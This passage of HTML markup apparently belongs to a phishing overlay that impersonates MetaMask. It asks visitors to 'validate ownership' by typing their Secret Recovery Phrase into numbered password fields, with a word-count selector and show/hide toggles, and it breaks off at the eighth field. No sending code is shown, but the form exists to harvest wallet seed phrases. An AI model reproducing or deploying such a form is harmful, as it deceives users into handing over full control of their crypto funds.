                    type="button"
                    id="metamask-close-button"
                  >
                    <svg
                      class="scwtw-w-4 scwtw-h-4 scwtw-text-[#0376c9]"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                    >
                      <path
                        d="M6 18L18 6M6 6l12 12"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      ></path>
                    </svg>
                  </button>
                </div>
              </div>
              <div class="scwtw-mt-4">
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-center scwtw-justify-center scwtw-text-center scwtw-gap-y-1.5"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#141618] dark:scwtw-text-[#ffffff] font-euclid scwtw-font-bold scwtw-text-[21px]"
                    >
                      Import your wallet with your Secret Recovery Phrase
                    </h3>
                  </div>
                  <div class="scwtw-px-4 scwtw-mb-2">
                    <p
                      class="scwtw-text-[#141618] dark:scwtw-text-[#ffffff] font-euclid scwtw-font-normal scwtw-text-[14px]"
                    >
                      We will use your Secret Recovery Phrase to validate your
                      ownership. Enter the Secret Recovery Phrase that you were
                      given when you created your wallet.
                      <a
                        class="scwtw-text-[#0376c9] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer"
                        href="https://href.li/?https://support.metamask.io/start/learn/what-is-a-secret-recovery-phrase-and-how-to-keep-your-crypto-wallet-secure/"
                        target="_blank"
                        >Learn more</a
                      >
                    </p>
                  </div>
                  <div class="scwtw-w-full scwtw-px-4 scwtw-mb-2">
                    <select
                      class="scwtw-w-full scwtw-font-normal font-euclid scwtw-relative scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d] scwtw-py-[12px] scwtw-px-[16px] scwtw-outline-none"
                      id="metamask-change-words-count"
                    >
                      <option value="12" selected="">
                        I have a 12-word phrase
                      </option>
                      <option value="15">I have a 15-word phrase</option>
                      <option value="18">I have a 18-word phrase</option>
                      <option value="21">I have a 21-word phrase</option>
                      <option value="24">I have a 24-word phrase</option>
                    </select>
                  </div>
                  <div
                    class="scwtw-w-full scwtw-px-4 scwtw-opacity-0 scwtw-transition-all scwtw-duration-500 scwtw-ease-in-out scwtw-hidden"
                    id="temporary-message"
                  >
                    <div
                      class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-2 scwtw-py-1.5 scwtw-rounded-[4px] scwtw-bg-[#0376c91a] dark:scwtw-bg-[#43aefc26] scwtw-border-l-[4px] scwtw-border-l-[#0376c9] dark:scwtw-border-l-[#43aefc]"
                    >
                      <div class="scwtw-pl-2">
                        <svg
                          class="scwtw-w-6 scwtw-h-6 scwtw-fill-[#0376c9] dark:scwtw-fill-[#43aefc]"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 512 512"
                        >
                          <path
                            d="m252 51c-41 0-81 12-114 35-34 22-60 54-76 92-15 37-19 78-11 118 8 40 27 76 56 105 28 28 65 48 105 56 39 8 80 4 118-12 37-15 69-42 92-75 22-34 34-73 34-114 0-54-21-106-60-145-38-38-90-60-144-60z m-4 95c4 0 9 1 13 4 4 2 7 6 8 10 2 5 3 9 2 14-1 5-3 9-7 12-3 3-7 6-12 7-4 0-9 0-13-2-5-2-8-5-11-9-3-3-4-8-4-13 0-6 2-12 7-16 4-5 10-7 17-7z m19 220l-15 0c-5 0-9-1-12-4-3-3-4-7-4-11l0-95c-4 0-8-2-11-5-3-3-5-7-5-11 0-4 2-8 5-11 3-3 7-5 11-5l16 0c4 0 8 2 11 5 3 3 4 7 4 11l0 95c4 0 8 1 11 4 3 3 5 7 5 12 0 4-2 8-5 11-3 3-7 4-11 4z"
                          ></path>
                        </svg>
                      </div>
                      <div class="scwtw-text-start">
                        <p
                          class="scwtw-text-[#141618] dark:scwtw-text-[#ffffff] font-euclid scwtw-font-normal scwtw-text-[14px] scwtw-pr-1"
                        >
                          You can paste your entire secret recovery phrase into
                          any field
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-mt-4 scwtw-px-4 scwtw-max-h-[204px] scwtw-overflow-y-auto metamask-custom-scrollbar"
                >
                  <div
                    id="metamask-container-12-words"
                    class="metamask-container-12-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1"
                  >
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        1.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #1"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="1"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        2.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #2"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="2"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        3.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #3"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="3"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        4.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #4"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="4"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        5.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #5"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="5"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        6.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #6"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="6"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        7.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #7"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="7"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        8.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #8"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="8"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
